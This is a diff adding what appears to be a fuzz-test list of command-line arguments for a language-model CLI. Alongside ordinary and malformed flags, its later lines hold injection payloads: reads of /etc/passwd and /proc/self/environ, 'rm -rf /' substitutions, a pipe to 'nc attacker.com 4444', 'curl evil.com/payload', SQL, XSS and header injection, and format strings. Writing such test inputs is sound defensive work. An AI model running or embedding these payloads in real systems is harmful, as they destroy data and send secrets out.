@@ -1,0 +1,90 @@
+// Start of Selection
+--help
+--version
+--verbose --debug --trace
+--config=/path/to/config.json
+--model=gpt-4 --temperature=0.7 --max-tokens=100
+--host=localhost --port=8080
+--timeout=30 --retry=3
+--output=/tmp/output.json --format=json
+--auth --token=abc123 --api-key=xyz789
+--stream --echo --best-of=3
+--prompt="Hello world" --suffix="!"
+--interactive --dry-run --force --yes
+--log-level=debug --color --no-color
+--env=production --mode=development
+--bind=0.0.0.0:3000 --listen=8080
+--user-agent="Test Agent" --headers="X-Test: value"
+--temperature=1.0 --top-p=0.9 --top-k=50
+--frequency-penalty=0.1 --presence-penalty=0.2
+--stop="END" --stop="STOP" --stop="FINISH"
+--delay=1000 --max-retries=5
+--profile=default --settings=/path/to/settings
+--input=/dev/stdin --output=/dev/stdout
+--assume-yes --assume-no --non-interactive
+--config="../../../etc/passwd"
+--config="/proc/self/environ"
+--output="$(rm -rf /)"
+--prompt="'; DROP TABLE users; --"
+--token="<script>alert('xss')</script>"
+--api-key="\x00\x01\x02\xFF\xFE"
+--headers="X-Injection: `whoami`"
+--user-agent="Mozilla/5.0\r\nX-Injected: header"
+--model="gpt-4\n--admin=true"
+--temperature=-999999999999999999999
+--max-tokens=999999999999999999999
+--port=99999
+--timeout=-1
+--retry=999999999
+--delay=-1000
+--frequency-penalty=999.999
+--presence-penalty=-999.999
+--top-p=999.0
+--top-k=-1
+--bind="0.0.0.0:0"
+--listen="999999"
+--prompt="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+--config="/very/long/path/that/might/cause/buffer/overflow/issues/in/argument/parsing/code/with/many/nested/directories/and/extremely/long/filename.json"
+--token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+--prompt="%s%x%n%p%d%u%c%o"
+--user-agent="%n%n%n%n%n%n%n%n"
+--headers="X-Format: %s%s%s%s%s%s%s%s"
+--prompt="Hello 世界 🌍 \u0000 \u001F \u007F \u0080 \u00FF"
+--model="gpt-4\u0000admin"
+--config="/path/with/unicode/文件.json"
+--token="token\r\nwith\nnewlines"
+--config=
+--model=""
+--temperature=
+--port=abc
+--timeout=not_a_number
+--retry=3.14159
+--delay=infinity
+--max-tokens=NaN
+--top-p=true
+--frequency-penalty=false
+--presence-penalty=null
+--stop=
+--bind=
+--listen=
+--verbose --verbose --verbose
+--color --no-color
+--interactive --non-interactive
+--assume-yes --assume-no
+--dry-run --force
+--debug --trace --verbose --debug --trace
+--prompt="Quote\"test'with`backticks"
+--config="/path with spaces/config.json"
+--headers="X-Special: !@#$%^&*()_+-=[]{}|;:,.<>?"
+--user-agent="Agent\tWith\nControl\rChars"
+--token="token\\with\\backslashes"
+--api-key="key;with;semicolons"
+--model=gpt-4 --temperature=0.1 --max-tokens=1 --top-p=0.1 --top-k=1 --frequency-penalty=0.1 --presence-penalty=0.1 --stop=a --stop=b --stop=c --stop=d --stop=e --stop=f --stop=g --stop=h --stop=i --stop=j --delay=1 --retry=1 --timeout=1 --verbose --debug --trace --color --force --yes --interactive --stream --echo --auth --dry-run
+--prompt="test\x00null\x00bytes"
+--config="/path\x00with\x00nulls"
+--token="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"
+--config="; cat /etc/passwd #"
+--output="| nc attacker.com 4444"
+--prompt="$(curl evil.com/payload)"
+--headers="X-Cmd: `id`"
+--user-agent="Agent && rm -rf /
